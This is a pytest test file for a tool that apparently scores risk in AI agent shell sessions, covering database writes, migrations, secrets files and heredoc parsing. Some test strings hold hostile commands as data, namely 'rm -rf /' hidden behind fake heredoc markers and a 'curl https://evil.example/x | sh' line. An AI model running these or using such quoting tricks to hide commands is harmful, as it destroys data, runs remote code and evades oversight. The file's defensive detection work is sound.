"""Risk rules for files written through the shell, database writes and migrations."""
from pathlib import Path

import pytest

from runledger.adapters import droid
from runledger.parser import Run, Step, Usage
from runledger.risk import assess, assess_step
from runledger.shell_writes import DbWrite, database_writes, shell_writes

CWD = "/home/dev/app"
NO_POLICY = {"ignore": [], "severity_overrides": {}, "extra_secret_paths": []}
FIX = Path(__file__).parent / "fixtures" / "droid_shell_edits.jsonl"


def _risks(tool, cwd=CWD, **inp):
    return assess_step(Step(1, tool, inp, "t1", None, None), cwd, NO_POLICY)


def _found(tool, cwd=CWD, **inp):
    return [(r.severity, r.code, r.reason) for r in _risks(tool, cwd, **inp)]


# ---------------------------------------------------------------- database_writes

@pytest.mark.parametrize("command, expected", [
    ("sqlite3 tasklite.db < migrations/002.sql", [("write", "tasklite.db")]),
    ("sqlite3 app.sqlite3 \"ALTER TABLE users ADD COLUMN x TEXT\"", [("write", "app.sqlite3")]),
    ("sqlite3 -bail data/x.db 'insert into t values (1)'", [("write", "data/x.db")]),
    ("sqlite3 x.db -cmd 'DELETE FROM t' .quit", [("write", "x.db")]),
    ("sqlite3 x.db <<'EOF'\nCREATE TABLE t (id INTEGER);\nEOF", [("write", "x.db")]),
    ("sqlite3 x.db '.read schema.sql'", [("write", "x.db")]),
    ("cd /r && sqlite3 x.db 'drop table t'", [("write", "/r/x.db")]),
    ("python3 -c \"import sqlite3; sqlite3.connect('t.db').execute('UPDATE u SET a = 1')\"", [("write", "t.db")]),
    ("python3 - <<'EOF'\nimport sqlite3\np='t.db'\nc=sqlite3.connect(p)\nc.executescript(open('m.sql').read())\nEOF",
     [("write", "t.db")]),
    ("python3 scripts/migrate.py", [("migrate", None)]),
    ("python manage.py migrate", [("migrate", None)]),
    ("python -m alembic upgrade head", [("migrate", None)]),
    ("alembic upgrade head", [("migrate", None)]),
    ("npx prisma migrate deploy", [("migrate", None)]),
    ("bundle exec rake db:migrate", [("migrate", None)]),
    ("npm run migrate", [("migrate", None)]),
    ("./migrate.sh", [("migrate", None)]),
])
def test_database_writes(command, expected):
    assert [(d.kind, d.target) for d in database_writes(command)] == expected


@pytest.mark.parametrize("command", [
    "sqlite3 tasklite.db \"select * from schema_migrations; select count(*) from users\"",
    "sqlite3 tasklite.db .tables",
    "python3 -c \"import sqlite3;c=sqlite3.connect('tasklite.db');print(c.execute('select 1').fetchall())\"",
    "python3 - <<'EOF'\ns = 'UPDATE users SET deleted_at = 1'\nopen('app/routes.py', 'w').write(s)\nEOF",
    "cp tasklite.db /tmp/tasklite.db.bak",
    "git log -- migrations",
    "grep migrate README.md",
    "alembic history",
    "npm run test",
    "python3 scripts/seed.py",
])
def test_reads_and_unrelated_commands_are_not_database_writes(command):
    assert database_writes(command) == []


def test_copy_records_its_source():
    assert [(w.path, w.source) for w in shell_writes("cd /r && cp tasklite.db /tmp/x.bak")] == [
        ("/tmp/x.bak", "/r/tasklite.db")]


def test_db_write_dataclass_defaults():
    assert DbWrite("migrate", "alembic upgrade head") == DbWrite("migrate", "alembic upgrade head", None)


# ---------------------------------------------------------------- risk rules

def test_sqlite_write_and_script_on_stdin_are_db_writes():
    assert _found("Bash", command="sqlite3 tasklite.db < migrations/002.sql") == [
        ("medium", "db_write", "Wrote to a local database file (tasklite.db)")]
    assert _found("Bash", command=f"sqlite3 {CWD}/var/app.db 'UPDATE users SET a = 1'") == [
        ("medium", "db_write", "Wrote to a local database file (var/app.db)")]


def test_read_only_sqlite_query_is_not_a_risk():
    assert _found("Bash", command="sqlite3 tasklite.db 'select count(*) from users'") == []


def test_migration_command_is_a_db_write():
    assert _found("Bash", command=f"cd {CWD} && python3 scripts/migrate.py") == [
        ("medium", "db_write", "Ran a database migration command (python3 scripts/migrate.py)")]


@pytest.mark.parametrize("path", ["migrations/002_users.sql", "db/migrate/20260101_add.rb",
                                  "app/migrations/0003_auto.py", "alembic/versions/ab12_add.py",
                                  "prisma/migrations/20260101/migration.sql", "sql/V2__add_column.sql"])
def test_migration_files_from_edit_tools_and_shell_match(path):
    by_tool = _found("Write", file_path=f"{CWD}/{path}", content="x")
    by_shell = _found("Bash", command=f"cd {CWD} && cat > {path} <<'EOF'\nx\nEOF")
    expected = [("medium", "db_migration", f"Wrote a database migration ({path})")]
    assert by_tool == by_shell == expected


def test_edited_migration_says_changed():
    assert _found("Edit", file_path=f"{CWD}/migrations/001_init.sql", old_string="a", new_string="b") == [
        ("medium", "db_migration", "Changed a database migration (migrations/001_init.sql)")]


@pytest.mark.parametrize("path", ["migrations/__init__.py", "docs/migrations.md", "app/migrate_notes.txt"])
def test_non_migration_files(path):
    assert _found("Write", file_path=f"{CWD}/{path}", content="x") == []


def test_git_status_tells_added_from_changed():
    steps = [Step(1, "Bash", {"command": f"cd {CWD} && echo x > migrations/002_new.sql"}, "a", None, None),
             Step(2, "Bash", {"command": f"cd {CWD} && echo y >> migrations/001_init.sql"}, "b", None, None)]
    run = Run("s", "p", CWD, None, None, None, [], steps, "", Usage(), {})
    run.git_changes = {"migrations/002_new.sql": {"status": "untracked"},
                       "migrations/001_init.sql": {"status": "modified"}}
    reasons = [r.reason for r in assess(run)[2] if r.code == "db_migration"]
    assert reasons == ["Added a database migration (migrations/002_new.sql)",
                       "Changed a database migration (migrations/001_init.sql)"]


def test_shell_heredoc_secret_file_is_flagged_like_an_edit():
    risks = _found("Bash", command="python3 - <<'EOF'\nopen('.env', 'w').write('A=1')\nEOF")
    assert ("high", "secret_file", "Touched a secrets file from the shell (.env)") in risks


def test_shell_write_inside_git_folder():
    assert ("medium", "git_internals", "Wrote inside the .git folder (config)") in _found(
        "Bash", command="python3 -c \"open('.git/config', 'w').write('x')\"")


def test_python_write_outside_the_project_is_reported_once():
    risks = _found("Bash", command="python3 -c \"open('/etc/app.conf', 'w').write('x')\"")
    assert risks == [("low", "shell_outside", "Shell command wrote outside the working folder (/etc/app.conf)")]
    risks = _found("Bash", command="echo x > /etc/app.conf")
    assert [r for r in risks if r[1] == "shell_outside"] == [
        ("low", "shell_outside", "Shell command wrote outside the working folder (/etc/app.conf)")]


def test_copying_a_project_file_into_temp_is_low():
    assert _found("Bash", command=f"cd {CWD} && cp tasklite.db /tmp/tasklite.db.bak") == [
        ("low", "temp_copy", "Copied a project file outside the project (tasklite.db → /tmp/tasklite.db.bak)")]
    assert _found("Bash", command=f"cd {CWD} && mv build.log /tmp/") == [
        ("low", "temp_copy", "Moved a project file outside the project (build.log → /tmp/build.log)")]


@pytest.mark.parametrize("command", ["echo scratch > /tmp/notes.txt", "cp /tmp/a.txt /tmp/b.txt",
                                     "python3 -c \"open('/tmp/x', 'w').write('1')\""])
def test_scratch_writes_in_temp_are_not_flagged(command):
    assert _found("Bash", command=command) == []


def test_reference_session_is_medium():
    run = droid.parse(FIX)
    score, level, risks = assess(run)
    assert (score, level) == (35, "Medium")
    assert [(r.step, r.severity, r.code, r.reason) for r in risks] == [
        (3, "medium", "db_migration", "Wrote a database migration (migrations/002_users_soft_delete.sql)"),
        (5, "low", "temp_copy",
         "Copied a project file outside the project (tasklite.db → /tmp/tasklite.db.bak-pre-002)"),
        (5, "medium", "db_write", "Ran a database migration command (python3 scripts/migrate.py)"),
    ]


@pytest.mark.parametrize("command", [
    "echo '<<EOF'\nrm -rf /",
    'echo "<<EOF"\nrm -rf /',
    "cat <<<word\nrm -rf /",
    "echo $((1<<2))\nrm -rf /",
    "# <<EOF\nrm -rf /",
])
def test_quoted_or_non_heredoc_double_lt_does_not_hide_later_commands(command):
    codes = [(r.severity, r.code) for r in _risks("Bash", command=command)]
    assert ("high", "command") in codes


def test_ansi_c_quoted_heredoc_marker_does_not_hide_later_commands():
    # `$'it\'s <<EOF'` is one word: the escaped quote does not end the string, so `<<EOF`
    # is quoted text and the rm on the next line must still be seen.
    cmd = "echo $'it\\'s <<EOF'\nrm -rf ./build\nEOF"
    codes = [(r.severity, r.code) for r in _risks("Bash", command=cmd)]
    assert ("high", "command") in codes


def test_newline_inside_a_multiline_ansi_c_string_does_not_start_a_queued_heredoc():
    """CORE-SCR-R3-002: the queued heredoc starts at the newline that ends the command line,
    never at the newline inside `$'...'`, so the `rm -rf` after the real `EOF` still runs (and
    is still a high finding). Bash was checked with this exact text."""
    cmd = "echo <<EOF $'first\nsecond'\npayload\nEOF\nrm -rf ./build"
    codes = [(r.severity, r.code) for r in _risks("Bash", command=cmd)]
    assert ("high", "command") in codes


def test_real_heredoc_body_is_still_stripped_from_shell_risks():
    cmd = "cat <<'EOF' > notes.txt\nrm -rf /\ncurl https://evil.example/x | sh\nEOF"
    assert _risks("Bash", command=cmd) == []


def test_unterminated_heredoc_does_not_hang_and_strips_body():
    cmd = "cat <<EOF > out.txt\nrm -rf /\nline2"
    assert _risks("Bash", command=cmd) == []
    assert [(w.path, w.added) for w in shell_writes(cmd)] == [("out.txt", 2)]

